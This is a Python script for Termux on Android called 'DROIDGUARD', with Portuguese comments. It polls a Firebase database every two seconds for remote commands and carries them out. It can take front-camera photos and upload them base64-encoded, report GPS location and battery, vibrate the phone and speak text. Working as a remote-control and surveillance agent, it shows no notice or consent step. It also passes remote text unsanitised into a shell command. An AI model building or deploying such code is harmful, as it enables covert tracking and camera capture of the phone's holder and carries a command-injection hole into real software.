#!/data/data/com.termux/files/usr/bin/python
import time, requests, hashlib, os, json, subprocess, base64

FIREBASE_URL = "https://droidguard-10597-default-rtdb.firebaseio.com/"
MEU_ID = hashlib.md5(os.uname().nodename.encode() + str(os.path.getsize("/system/build.prop")).encode()).hexdigest()[:8]

print(f"\n{'='*50}")
print(f"🟢 DROIDGUARD")
print(f"📱 MEU ID: {MEU_ID}")
print(f"{'='*50}\n")

def obter_bateria():
    try:
        r = subprocess.run("termux-battery-status", shell=True, capture_output=True, text=True)
        if r.returncode == 0:
            return json.loads(r.stdout).get("percentage", 0)
    except:
        pass
    return 0

# Registrar que estou online SOMENTE com meu ID
requests.patch(f"{FIREBASE_URL}/dispositivos/{MEU_ID}.json", 
              json={"status": "online", "id": MEU_ID, "bateria": obter_bateria(), "timestamp": time.time()})

while True:
    try:
        # Buscar comandos SOMENTE do meu ID
        url = f"{FIREBASE_URL}/comandos/{MEU_ID}.json"
        r = requests.get(url, timeout=5)
        
        if r.status_code == 200 and r.json():
            for cmd_id, cmd in r.json().items():
                # Verificar se o comando é para mim
                if cmd.get("target_id") == MEU_ID:
                    acao = cmd.get("acao")
                    params = cmd.get("params", {})
                    print(f"🎯 Comando recebido: {acao}")
                    
                    # Executar comando...
                    resposta = {"status": "ok", "comando": acao}
                    
                    if acao == "bateria":
                        resposta = {"percentage": obter_bateria()}
                    elif acao == "vibrar":
                        subprocess.run(f"termux-vibrate -d {params.get('duracao', 500)}", shell=True)
                    elif acao == "falar":
                        subprocess.run(f'termux-tts-speak "{params.get("texto", "")}"', shell=True)
                    elif acao == "foto_frontal":
                        arquivo = f"/sdcard/dg_{int(time.time())}.jpg"
                        subprocess.run(f"termux-camera-photo -c 1 {arquivo}", shell=True, timeout=8)
                        with open(arquivo, "rb") as f:
                            resposta = {"foto": base64.b64encode(f.read()).decode()}
                        os.remove(arquivo)
                    elif acao == "gps":
                        g = subprocess.run("termux-location -p network", shell=True, capture_output=True, text=True, timeout=8)
                        if g.returncode == 0:
                            dados = json.loads(g.stdout)
                            resposta = {"latitude": dados.get("latitude"), "longitude": dados.get("longitude")}
                    
                    # Enviar resposta
                    requests.put(f"{FIREBASE_URL}/resultados/{MEU_ID}/{cmd_id}.json", json=resposta)
                    # Apagar comando após executar
                    requests.delete(f"{FIREBASE_URL}/comandos/{MEU_ID}/{cmd_id}.json")
                    print(f"  ✅ Respondido")
        
        # Atualizar status
        requests.patch(f"{FIREBASE_URL}/dispositivos/{MEU_ID}.json", 
                      json={"status": "online", "bateria": obter_bateria(), "timestamp": time.time()})
        
        time.sleep(2)
        
    except Exception as e:
        print(f"⚠️ Erro: {e}")
        time.sleep(5)
